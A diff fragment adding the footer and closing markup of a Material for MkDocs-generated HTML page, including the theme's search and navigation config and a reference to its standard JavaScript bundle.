+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "content.code.annotate", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.e5c33ebb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.ba449ae6.min.js"></script>
+      
+    
+  </body>
+</html>
